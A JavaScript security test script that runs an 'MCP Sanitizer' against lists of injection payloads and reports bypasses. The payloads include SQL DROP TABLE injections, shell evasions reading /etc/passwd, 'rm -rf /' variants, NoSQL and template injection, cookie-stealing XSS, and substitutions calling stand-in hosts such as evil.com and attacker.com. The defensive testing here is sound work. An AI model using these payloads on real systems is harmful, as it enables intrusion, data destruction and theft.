/**
 * Advanced Injection Attack Security Analysis
 * 
 * This script performs deep security analysis of the MCP Sanitizer
 * focusing on advanced injection vectors and bypass techniques
 * based on real-world attack patterns from 2023-2024.
 */

const MCPSanitizer = require('./src/index');

class InjectionSecurityAnalyzer {
  constructor() {
    this.sanitizer = new MCPSanitizer('PRODUCTION');
    this.vulnerabilities = [];
    this.testResults = {
      postgresql: { total: 0, bypassed: 0 },
      commandInjection: { total: 0, bypassed: 0 },
      multiEncoding: { total: 0, bypassed: 0 },
      nosql: { total: 0, bypassed: 0 },
      secondOrder: { total: 0, bypassed: 0 },
      unicodeBypass: { total: 0, bypassed: 0 }
    };
  }

  log(message, level = 'INFO') {
    const timestamp = new Date().toISOString();
    const levels = { ERROR: '🔴', WARN: '🟡', INFO: '🔵', SUCCESS: '🟢' };
    console.log(`[${timestamp}] ${levels[level]} ${message}`);
  }

  addVulnerability(category, severity, payload, details) {
    this.vulnerabilities.push({
      category,
      severity,
      payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : ''),
      details,
      timestamp: new Date().toISOString()
    });
    this.log(`VULNERABILITY FOUND [${severity}]: ${category} - ${details}`, 'ERROR');
  }

  testPayload(category, payload, expectedBlocked = true, context = {}) {
    this.testResults[category].total++;
    
    try {
      const result = this.sanitizer.sanitize(payload, context);
      
      if (!result.blocked && expectedBlocked) {
        this.testResults[category].bypassed++;
        return { bypassed: true, result, payload };
      } else if (result.blocked && !expectedBlocked) {
        return { falsePositive: true, result, payload };
      }
      
      return { bypassed: false, result, payload };
    } catch (error) {
      // Errors are expected for malicious payloads
      return { bypassed: false, error: error.message, payload };
    }
  }

  /**
   * Test 1: PostgreSQL Dollar Quoting Bypass Techniques
   * CVE-2023-XXXX patterns and advanced dollar quote evasion
   */
  async testPostgreSQLDollarQuoting() {
    this.log('Testing PostgreSQL dollar quoting bypass techniques...', 'INFO');
    
    const dollarQuotePayloads = [
      // Standard dollar quotes
      "SELECT $$; DROP TABLE users; --$$",
      "SELECT $tag$; DROP TABLE users; --$tag$",
      
      // Nested dollar quotes
      "SELECT $outer$ $inner$; DROP TABLE users;$inner$ $outer$",
      
      // Mixed quotes with SQL injection
      "SELECT $a$' UNION SELECT password FROM users --$a$",
      
      // Encoded dollar quotes
      "SELECT \\$\\$; DROP TABLE users; --\\$\\$",
      
      // Unicode dollar quotes (potential bypass)
      "SELECT \uFF04\uFF04; DROP TABLE users; --\uFF04\uFF04",
      
      // Dollar quotes in COPY commands
      "COPY (SELECT $$; DROP TABLE users; --$$) TO PROGRAM 'cat'",
      
      // Function calls within dollar quotes
      "SELECT $func$ SELECT version(); DROP TABLE users; $func$",
      
      // PostgreSQL-specific functions in dollar quotes
      "SELECT $pg$ SELECT pg_sleep(10); DROP TABLE users; $pg$",
      
      // Bypassing with whitespace and comments
      "SELECT $/*comment*/$ /*comment*/ DROP TABLE users; --$/*comment*/$",
      
      // Case variations
      "select $TAG$; drop table users; --$tag$",
      "SELECT $TaG$; DrOp TaBlE users; --$TaG$",
      
      // Multiple statements in dollar quotes
      "SELECT $multi$SELECT 1; CREATE TABLE evil AS SELECT * FROM users; DROP TABLE users;$multi$",
      
      // Advanced: Using dollar quotes to bypass string filters
      "SELECT $bypass$admin' OR '1'='1$bypass$ AS username",
      
      // PostgreSQL-specific: Using dollar quotes with EXECUTE
      "EXECUTE $exec$SELECT version(); DROP TABLE users;$exec$"
    ];

    for (const payload of dollarQuotePayloads) {
      const testResult = this.testPayload('postgresql', payload, true, { type: 'sql' });
      
      if (testResult.bypassed) {
        this.addVulnerability(
          'PostgreSQL Dollar Quoting',
          'CRITICAL',
          payload,
          'Dollar quote bypass allows SQL injection'
        );
      }
    }

    this.log(`PostgreSQL testing complete: ${this.testResults.postgresql.bypassed}/${this.testResults.postgresql.total} bypassed`, 
             this.testResults.postgresql.bypassed > 0 ? 'ERROR' : 'SUCCESS');
  }

  /**
   * Test 2: Advanced Command Injection Evasion
   * Based on recent bug bounty reports and CVE patterns
   */
  async testCommandInjectionEvasion() {
    this.log('Testing advanced command injection evasion techniques...', 'INFO');
    
    const commandPayloads = [
      // Bash parameter expansion bypasses
      'ca${PATH:0:1}t /etc/passwd',
      'c${USER:0:1}t /etc/passwd', 
      '${PATH%%:*} /etc/passwd',
      '${PATH##*/} /etc/passwd',
      
      // Advanced IFS manipulation
      'cat${IFS}/etc/passwd',
      'cat$IFS/etc/passwd',
      'cat${IFS%?}/etc/passwd',
      
      // Glob pattern bypasses
      'ca[t] /etc/passwd',
      'c?t /etc/passwd',
      '/bin/c[a]t /etc/passwd',
      
      // Unicode command separators
      'cat\u2028/etc/passwd',
      'cat\u2029/etc/passwd',
      'cat\u00A0/etc/passwd',
      
      // Process substitution
      'cat <(/bin/echo /etc/passwd)',
      'cat <(echo /etc/passwd)',
      
      // Command substitution with backticks
      'cat `/bin/echo /etc/passwd`',
      'cat `echo /etc/passwd`',
      
      // ANSI-C quoting
      'cat $\'/etc/passwd\'',
      'cat $\'\\x2fetc\\x2fpasswd\'',
      
      // Heredoc injection
      'cat<<EOF\n/etc/passwd\nEOF',
      'cat<<<"/etc/passwd"',
      
      // Arithmetic expansion
      'cat /etc/passwd$((1-1))',
      'cat /etc/pass$((119-119))wd',
      
      // Time-based command injection
      'sleep$((1*5))',
      'ping$IFS-c$IFS5$IFS127.0.0.1',
      
      // Environment variable expansion in paths
      'cat $HOME/../../../etc/passwd',
      'cat $TMPDIR/../../../etc/passwd',
      
      // Advanced quoting combinations
      '"c"\'a\'t /etc/passwd',
      '\'c\'\"a\"t /etc/passwd',
      
      // Null byte with command continuation
      'cat\x00; rm -rf /',
      'echo test\x00`rm -rf /`',
      
      // Windows-specific bypasses (if applicable)
      'cmd.exe/c"type %windir%\\system32\\drivers\\etc\\hosts"',
      'powershell.exe -c "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts"'
    ];

    for (const payload of commandPayloads) {
      const testResult = this.testPayload('commandInjection', payload, true, { type: 'command' });
      
      if (testResult.bypassed) {
        this.addVulnerability(
          'Command Injection Evasion',
          'CRITICAL',
          payload,
          'Advanced command injection bypass detected'
        );
      }
    }

    this.log(`Command injection testing complete: ${this.testResults.commandInjection.bypassed}/${this.testResults.commandInjection.total} bypassed`,
             this.testResults.commandInjection.bypassed > 0 ? 'ERROR' : 'SUCCESS');
  }

  /**
   * Test 3: Multi-Layer Encoding Bypass
   * Testing double, triple, and mixed encoding scenarios
   */
  async testMultiEncodingBypass() {
    this.log('Testing multi-layer encoding bypass techniques...', 'INFO');
    
    // Helper function to apply multiple encoding layers
    const applyMultipleEncoding = (payload, encodings) => {
      let encoded = payload;
      for (const encoding of encodings) {
        switch (encoding) {
          case 'url':
            encoded = encodeURIComponent(encoded);
            break;
          case 'url-double':
            encoded = encodeURIComponent(encodeURIComponent(encoded));
            break;
          case 'unicode':
            encoded = encoded.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
            break;
          case 'html':
            encoded = encoded.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
            break;
          case 'hex':
            encoded = encoded.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
            break;
        }
      }
      return encoded;
    };

    const basePayloads = [
      'cat /etc/passwd',
      "'; DROP TABLE users; --",
      '<script>alert("xss")</script>',
      '../../../etc/passwd'
    ];

    const encodingCombinations = [
      ['url', 'url'],
      ['url', 'url', 'url'],
      ['unicode', 'url'],
      ['html', 'url'],
      ['hex', 'url'],
      ['url', 'unicode', 'url'],
      ['html', 'unicode', 'url']
    ];

    for (const payload of basePayloads) {
      for (const encodings of encodingCombinations) {
        const encodedPayload = applyMultipleEncoding(payload, encodings);
        const context = { type: payload.includes('DROP') ? 'sql' : payload.includes('<script>') ? 'html' : 'command' };
        
        const testResult = this.testPayload('multiEncoding', encodedPayload, true, context);
        
        if (testResult.bypassed) {
          this.addVulnerability(
            'Multi-Layer Encoding Bypass',
            'HIGH',
            encodedPayload,
            `${encodings.join('->')} encoding bypass for: ${payload}`
          );
        }
      }
    }

    this.log(`Multi-encoding testing complete: ${this.testResults.multiEncoding.bypassed}/${this.testResults.multiEncoding.total} bypassed`,
             this.testResults.multiEncoding.bypassed > 0 ? 'ERROR' : 'SUCCESS');
  }

  /**
   * Test 4: NoSQL Injection Protection
   * MongoDB, CouchDB, and other NoSQL injection vectors
   */
  async testNoSQLInjection() {
    this.log('Testing NoSQL injection vectors...', 'INFO');
    
    const nosqlPayloads = [
      // MongoDB injection patterns
      '{"$where": "this.username == this.password"}',
      '{"$where": "function() { return this.username == \'admin\' }"}',
      '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
      '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      
      // MongoDB JavaScript injection
      '{"$where": "sleep(5000) || true"}',
      '{"$where": "function() { var d = new Date(); while ((new Date() - d) < 5000); return true; }"}',
      
      // CouchDB injection patterns
      '{"selector": {"_id": {"$gt": null}}}',
      '{"selector": {"username": {"$regex": ".*"}}}',
      
      // Redis injection patterns
      'EVAL "redis.call(\'flushall\')" 0',
      'EVAL "return redis.call(\'get\', \'sensitive_key\')" 0',
      
      // Cassandra injection patterns
      'SELECT * FROM users WHERE token(id) > token(?)',
      'SELECT * FROM users ALLOW FILTERING',
      
      // Advanced MongoDB patterns
      '{"username": {"$exists": true}, "password": {"$exists": true}}',
      '{"$or": [{"username": "admin"}, {"role": "admin"}]}',
      '{"username": {"$in": ["admin", "root", "administrator"]}}',
      
      // Boolean-based NoSQL injection
      'true, $where: \'1 == 1\'',
      'admin\', $where: \'1 == 1\', a: \'a',
      
      // Time-based NoSQL injection
      '{"$where": "sleep(Math.floor(Math.random() * 1000) + 5000) || true"}',
      
      // Server-side JavaScript injection (SSJS)
      '"; var date = new Date(); do { curDate = new Date(); } while(curDate-date<5000); "',
      
      // NoSQL operator injection
      '{"password": {"$regex": "^(?=.*a)(?=.*b)(?=.*c).*"}}',
      '{"age": {"$mod": [10, 0]}}'
    ];

    for (const payload of nosqlPayloads) {
      const testResult = this.testPayload('nosql', payload, true, { type: 'query' });
      
      if (testResult.bypassed) {
        this.addVulnerability(
          'NoSQL Injection',
          'HIGH',
          payload,
          'NoSQL injection vector bypassed validation'
        );
      }
    }

    this.log(`NoSQL testing complete: ${this.testResults.nosql.bypassed}/${this.testResults.nosql.total} bypassed`,
             this.testResults.nosql.bypassed > 0 ? 'ERROR' : 'SUCCESS');
  }

  /**
   * Test 5: Second-Order Injection Vulnerabilities
   * Data that becomes dangerous after storage and retrieval
   */
  async testSecondOrderInjection() {
    this.log('Testing second-order injection vulnerabilities...', 'INFO');
    
    const secondOrderPayloads = [
      // Payloads that might be stored safely but become dangerous later
      "user'; DROP TABLE logs; --",
      "admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--",
      
      // Context-switching payloads
      'normal_user" onmouseover="alert(1)" data="',
      'user</script><script>alert("xss")</script>',
      
      // File inclusion payloads that trigger later
      '../../../etc/passwd%00.txt',
      '....//....//....//etc/passwd',
      
      // Template injection that activates later
      '{{config.items()}}',
      '#{7*7}',
      '${{7*7}}',
      '<%=7*7%>',
      
      // LDAP injection for later use
      'user)(|(objectClass=*))',
      'user*)(&(objectClass=user))',
      
      // Serialization attacks
      'O:8:"stdClass":1:{s:4:"test";s:4:"hack";}',
      'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleA',
      
      // Command injection in file names/paths
      '$(curl evil.com)',
      '`nc attacker.com 4444`',
      
      // SQL injection in metadata
      "filename'; UPDATE users SET role='admin' WHERE id=1; --",
      
      // XSS in error messages
      '<img src=x onerror=alert(document.cookie)>',
      
      // Path traversal in logs
      '../../../../../../var/log/auth.log'
    ];

    // Test both immediate and delayed contexts
    for (const payload of secondOrderPayloads) {
      // Test immediate sanitization
      const immediateResult = this.testPayload('secondOrder', payload, true, { type: 'text' });
      
      if (immediateResult.bypassed) {
        this.addVulnerability(
          'Second-Order Injection (Immediate)',
          'MEDIUM',
          payload,
          'Payload not properly sanitized for storage'
        );
      }

      // Simulate retrieval in different contexts
      const contexts = ['sql', 'command', 'url', 'file_path'];
      for (const contextType of contexts) {
        const contextResult = this.testPayload('secondOrder', payload, true, { type: contextType });
        
        if (contextResult.bypassed) {
          this.addVulnerability(
            'Second-Order Injection (Context Switch)',
            'HIGH',
            payload,
            `Payload dangerous when used in ${contextType} context`
          );
        }
      }
    }

    this.log(`Second-order testing complete: ${this.testResults.secondOrder.bypassed}/${this.testResults.secondOrder.total} bypassed`,
             this.testResults.secondOrder.bypassed > 0 ? 'ERROR' : 'SUCCESS');
  }

  /**
   * Test 6: Unicode Normalization Bypass
   * Advanced Unicode attack vectors and normalization issues
   */
  async testUnicodeBypass() {
    this.log('Testing Unicode normalization bypass techniques...', 'INFO');
    
    const unicodePayloads = [
      // Homograph attacks
      'аdmin', // Cyrillic 'а'
      'аdmіn', // Mixed Cyrillic
      'ġoogle.com', // Turkish dotted g
      
      // Right-to-left override attacks
      'user‮moc.evil.www‭@legitimate.com',
      'file‮gpj.innocent‭.exe',
      
      // Zero-width character injection
      'adm\u200Bin',
      'ad\u200Cmin',
      'ad\uFEFFmin',
      
      // Combining character attacks
      'a\u0300d\u0301m\u0302i\u0303n',
      
      // Mathematical alphanumeric symbols
      '\ud835\udd8e\ud835\udd89\ud835\udd92\ud835\udd8e\ud835\udd93', // Mathematical bold 'admin'
      
      // Fullwidth character bypasses
      'ａｄｍｉｎ',
      
      // Mixed script confusables
      'раураӏ.com', // Mixed Latin/Cyrillic
      
      // Normalization attacks
      'café' + '\u0301', // Composed vs decomposed
      
      // Directional isolate attacks
      'test\u2066evil\u2069safe',
      
      // Invisible separator attacks
      'user\u2062name',
      'pass\u2063word',
      
      // Mixed number systems
      '𝟏𝟐𝟑', // Mathematical bold digits
      '①②③', // Circled numbers
      
      // Case mapping attacks
      'İnstagram.com', // Turkish capital I with dot
      
      // NFKC normalization bypasses
      '＜ｓｃｒｉｐｔ＞', // Fullwidth < script >
      
      // Bidi override in URLs
      'https://legitimate.com‮moc.evil.attacker‭/page'
    ];

    for (const payload of unicodePayloads) {
      const testResult = this.testPayload('unicodeBypass', payload, true, { type: 'text' });
      
      if (testResult.bypassed) {
        this.addVulnerability(
          'Unicode Normalization Bypass',
          'MEDIUM',
          payload,
          'Unicode attack vector not properly normalized'
        );
      }
    }

    this.log(`Unicode bypass testing complete: ${this.testResults.unicodeBypass.bypassed}/${this.testResults.unicodeBypass.total} bypassed`,
             this.testResults.unicodeBypass.bypassed > 0 ? 'ERROR' : 'SUCCESS');
  }

  /**
   * Generate comprehensive security report
   */
  generateReport() {
    const totalTests = Object.values(this.testResults).reduce((sum, cat) => sum + cat.total, 0);
    const totalBypassed = Object.values(this.testResults).reduce((sum, cat) => sum + cat.bypassed, 0);
    const overallSuccess = ((totalTests - totalBypassed) / totalTests * 100).toFixed(2);

    console.log('\n' + '='.repeat(80));
    console.log('🛡️  COMPREHENSIVE INJECTION SECURITY ASSESSMENT REPORT');
    console.log('='.repeat(80));
    
    console.log('\n📊 OVERALL STATISTICS:');
    console.log(`Total Test Vectors: ${totalTests}`);
    console.log(`Total Bypasses Found: ${totalBypassed}`);
    console.log(`Overall Protection Rate: ${overallSuccess}%`);
    
    console.log('\n📈 CATEGORY BREAKDOWN:');
    Object.entries(this.testResults).forEach(([category, results]) => {
      const successRate = ((results.total - results.bypassed) / results.total * 100).toFixed(1);
      const status = results.bypassed === 0 ? '✅' : results.bypassed <= 2 ? '⚠️' : '❌';
      console.log(`${status} ${category}: ${successRate}% (${results.bypassed}/${results.total} bypassed)`);
    });

    if (this.vulnerabilities.length > 0) {
      console.log('\n🚨 CRITICAL VULNERABILITIES FOUND:');
      console.log('-'.repeat(80));
      
      this.vulnerabilities.forEach((vuln, index) => {
        console.log(`\n${index + 1}. [${vuln.severity}] ${vuln.category}`);
        console.log(`   Payload: ${vuln.payload}`);
        console.log(`   Details: ${vuln.details}`);
        console.log(`   Time: ${vuln.timestamp}`);
      });
    }

    console.log('\n' + '='.repeat(80));
    
    return {
      overallSuccess: parseFloat(overallSuccess),
      totalTests,
      totalBypassed,
      vulnerabilities: this.vulnerabilities,
      categoryResults: this.testResults
    };
  }

  /**
   * Run all security tests
   */
  async runAllTests() {
    this.log('🚀 Starting comprehensive injection security analysis...', 'INFO');
    
    await this.testPostgreSQLDollarQuoting();
    await this.testCommandInjectionEvasion();
    await this.testMultiEncodingBypass();
    await this.testNoSQLInjection();
    await this.testSecondOrderInjection();
    await this.testUnicodeBypass();
    
    const report = this.generateReport();
    
    if (report.totalBypassed === 0) {
      this.log('✅ ALL SECURITY TESTS PASSED - NO BYPASSES DETECTED!', 'SUCCESS');
    } else {
      this.log(`❌ SECURITY ASSESSMENT FAILED - ${report.totalBypassed} BYPASS(ES) DETECTED!`, 'ERROR');
    }
    
    return report;
  }
}

// Execute analysis if run directly
if (require.main === module) {
  const analyzer = new InjectionSecurityAnalyzer();
  analyzer.runAllTests().catch(error => {
    console.error('❌ Security analysis failed:', error);
    process.exit(1);
  });
}

module.exports = InjectionSecurityAnalyzer;